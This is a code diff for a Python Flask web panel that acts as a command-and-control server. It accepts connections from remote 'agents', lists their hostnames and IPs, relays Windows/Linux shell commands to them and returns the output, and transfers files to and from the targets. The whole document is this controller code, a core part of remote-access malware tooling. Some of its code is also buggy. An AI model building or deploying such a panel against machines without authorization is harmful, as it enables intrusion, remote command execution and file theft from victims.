@@ -1,16 +1,25 @@
 from audioop import add
 import socket
+from sqlite3 import connect
 import threading
 import time
 from flask import *
-
+import shutil 
+from pathlib import Path
 ip_address ='127.0.0.1'
 port_number = 5555
+packet_size = 2048
 COMPUTERS=[]
 CONNECTIONS=[]
 IPS = []
 CMD_INPUT = []
 CMD_OUTPUT = []
+
+Conns = {}
+HELP_COMMANDS = ['?','HELP','help']
+HELP = 'Send Windows\\ Linux commands. \n you can also send files to minion with command - download [path_on_host] [path_on_target] \n \
+  get file from minion run command - upload [path_on_target] [path_on_host] -'
+
 
 
 app = Flask(__name__)
@@ -26,56 +35,89 @@ def server():
     print("Starting Server....")
     server_socket.listen(5)
     x=0
+    INDEX =0
     while(True):
         connection,address = server_socket.accept()
         print(connection)
-        if connection not in CONNECTIONS:
-            CONNECTIONS.append(connection)
-            IPS.append(address)
-            CMD_INPUT.append(f"")
+        if connection not in Conns:
+            hostname = connection.recv(packet_size).decode()
+            connection_status = {}
+            connection_status['IP'] = address[0]
+            connection_status['Port'] = address[1]
+            connection_status['Hostname'] = hostname
+            connection_status['Index'] = INDEX
+            Conns[connection] = connection_status
+            print(Conns)
+            CMD_INPUT.append("")
             CMD_OUTPUT.append("")
-            hostname = connection.recv(1024).decode()
-            COMPUTERS.append(hostname)
-        thread_index= find_connection(connection)
-        t=threading.Thread(target=handle_connection,args=(connection,thread_index))
-        t.start()
-        print('thread Started')
+            INDEX= INDEX +1
+            print(Conns[connection])
+            print("about to start thread")
+            print(type(connection))
+            t=threading.Thread(target=handle_connection,args=(connection,))
+            t.start()
+            print('thread Started')
         
 
+def send_file(socket, filename):
+    with open(filename,'rb') as inp:
+        while True:
+            print("sending data")
+            bytes_read = inp.read(packet_size)
+            if not bytes_read:
+                print("breaking")
+                time.sleep(1)
+                socket.send(b'Send was done')
+                break
+            socket.send(bytes_read)
+    inp.close()
 
-def handle_connection(connection,thread_index):
-    
-    print(COMPUTERS)
-    print("out of while")
+def recv_file(socket,filename):
+    print(filename)
+    with open(filename,'wb') as out:
+        while True:
+            print("recieving data")
+            bytes_read = socket.recv(packet_size)
+            print(bytes_read)
+            if bytes_read == b'Send was done':
+                print("breaking")
+                break
+            out.write(bytes_read)
+    out.close()
+
+
+def handle_connection(connection):
+    thread_index = Conns[connection]['Index']
     while CMD_INPUT[thread_index] != 'bye':
         while CMD_INPUT[thread_index]!='':
-            print('inside of while')    
             usr_msg = CMD_INPUT[thread_index]
             print(f'about to send {usr_msg}')
             connection.send(usr_msg.encode())
-            if CMD_INPUT[thread_index] !='bye':
+            if CMD_INPUT[thread_index].split(" ")[0] =='download':
+                send_file(connection,CMD_INPUT[thread_index].split(" ")[1])
                 CMD_INPUT[thread_index]=''
-                usr_msg=connection.recv(1024).decode()
+
+            elif CMD_INPUT[thread_index].split(" ")[0] =='upload':
+                print(CMD_INPUT[thread_index].split(" "))
+                recv_file(connection,CMD_INPUT[thread_index].split(" ")[-1])
+                CMD_INPUT[thread_index]=''
+
+            elif CMD_INPUT[thread_index] !='bye':            
+                usr_msg=connection.recv(packet_size).decode()
                 CMD_OUTPUT[thread_index]=usr_msg
                 print("Leaving second while!!!!")
+                CMD_INPUT[thread_index]=''
             break
-    app.logger.info(f'disconnecting {COMPUTERS[thread_index]}!!!!!!!!!!!!!!!!!!')
-    disconnect(connection,thread_index)
+    del Conns[connection]
 
-def disconnect(connection,thread_index):
-    connection.close()
-    CMD_INPUT.pop(thread_index)
-    CONNECTIONS.pop(thread_index)
-    IPS.pop(thread_index)
-    CMD_OUTPUT.pop(thread_index)
-    COMPUTERS.pop(thread_index)
+
 
 
 def find_connection(connection):
-    for i,conn in enumerate(CONNECTIONS):
+    for conn,val in Conns:
+        print(conn)
         if conn == connection:
-            return i
-
+            return val['Index']
 
 @app.route("/home")
 def index():
@@ -83,30 +125,35 @@ def index():
 
 @app.route("/agents")
 def agents():
-    return render_template('agents.html',computers=COMPUTERS,ips=IPS)
+    return render_template('agents.html',computers=Conns)
 
-
-@app.route("/<agentname>/executecmd")
-def executecmd(agentname):
-    return render_template("executecmd.html",name=agentname)
 
 @app.route("/<agentname>/executecmd",methods=['GET','POST'])
-def execute(agentname):
+def execute(agentname,cmdoutput='',cmd_input=""):
     if request.method == 'POST':
         cmd = request.form['command']
-        for i in COMPUTERS:
-            if agentname == i:
-                req_index = COMPUTERS.index(i)
+
+        for _,val in Conns.items():
+            print(val)
+            print(agentname)
+            if agentname == val['Hostname']:
+                req_index = val['Index']
                 print(req_index)
                 break
-        CMD_INPUT[req_index] = cmd
+        if cmd in HELP_COMMANDS:
+            cmdoutput=HELP
+            return render_template("executecmd.html",cmdoutput=cmdoutput.strip(),name=agentname)
+
+        CMD_INPUT[req_index] = cmd.strip()
         time.sleep(2)
         if cmd == 'bye':
             return redirect("/agents")
         else:
             cmdoutput = CMD_OUTPUT[req_index]
-            return render_template('executecmd.html',cmdoutput=cmdoutput.strip(),name=COMPUTERS[req_index])
-
+            print(cmdoutput)
+            return render_template('executecmd.html',cmdoutput=cmdoutput.strip(),name=agentname,cmd_input=cmd)
+    if request.method == 'GET':
+        return render_template("executecmd.html",name=agentname,cmdoutput=cmdoutput,cmd_input=cmd_input)
 
 if __name__=='__main__':
     app.run(debug=True,threaded=True)
